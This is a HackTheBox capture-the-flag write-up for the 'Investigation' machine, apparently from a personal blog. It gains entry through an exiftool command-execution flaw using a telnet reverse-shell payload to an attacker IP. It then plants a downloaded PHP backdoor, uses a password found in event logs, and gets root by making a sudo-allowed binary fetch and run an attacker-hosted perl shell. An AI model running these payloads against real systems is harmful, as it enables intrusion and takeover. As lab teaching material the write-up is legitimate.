---
layout: default
title: Investigation
author: k0z4c 
tags: hackthebox
---


Looking through the website it's easy to spot the vulnerability 

![]({% link assets/htb/investigation/front.png %})

the exiftool version used to analyze the uploaded jpg is vulnerable to command execution

<https://www.cvedetails.com/cve/CVE-2022-23935>

here the exploit 

<https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429>


we can go classic with this payload and breach in it  

```bash 
mkfifo die p && telnet 10.10.14.166 8888 0<die | sh 1>die |
```

![]({% link assets/htb/investigation/breach.png %})


![]({% link assets/htb/investigation/access.png %})


and from there download a more comfortable backdoor 

```bash
wget http://10.10.14.208/qsd-php-backdoor.php -O /var/www/html/analysed_images/kozacdoor.php
```

```bash
http://eforenzics.htb/analysed_images/kozacdoor.php
```

![]({% link assets/htb/investigation/kozacdoor.png %})

a smorton user is found ... 

![]({% link assets/htb/investigation/users.png %})


looking for something from smorton user smorton
```bash
find / -user smorton -readable 
...
/usr/local/investigation/Windows Event Logs for Analysis.msg
...
```

![]({% link assets/htb/investigation/props.png %})


after downloadin the e-mail the message has to be extracted 

<https://github.com/TeamMsgExtractor/msg-extractor>

![]({% link assets/htb/investigation/letters.png %})



the attachment are evtx logs that have to be analyzed.
Within the event id 4776 ( credential validation ) some credentials are found 
 
 ```bash
Def@ultf0r3nz!csPa$$ 
```

![]({% link assets/htb/investigation/logs.png %})


so it's possible to login as the smorton user 
```bash
ssh smorton@investigation.htb 
```

then we have this
```bash 
sudo -l 
(root) NOPASSWD: /usr/bin/binary
```

![]({% link assets/htb/investigation/sudo.png %})



to analyze locally the binary it has to be downloaded 

```bash
scp smorton@investigation.htb:/usr/bin/binary .
```

Decompiling  the binary we see that we have todo this 
```bash
sudo ./binary 3 lDnxUysaQn 
```

![]({% link assets/htb/investigation/ghidra.png %})


and looking for connections curl is trying to connect on port 80 of 0.0.0.3 

![]({% link assets/htb/investigation/trace.png %})


but.. 3 is also what i've set as the 2nd argument to launch the binary (the first one is the name of the invoked program itself, ‘binary’ )
in fact looking back to the ghidra's decompiled code it's possible to see that 3 is the number of args init with param_1 and that is assigned to the url 
component of curl (curl_easy_perform https://curl.se/libcurl/c/curl_easy_perform.html ) 

![]({% link assets/htb/investigation/perform.png %})


so changing to the attacker's IP it's possible to hijack the download endpoint and execute code through perl.


A file is created with the following content 

*test.pl*
```bash
exec "sh";
```

a web server serving the payload is set up with 
```bash
python3 -m http.server 80
```


running now  the binary 
```bash
sudo /usr/bin/binary 10.10.14.173/test.pl lDnxUysaQn
```

![]({% link assets/htb/investigation/root.png %})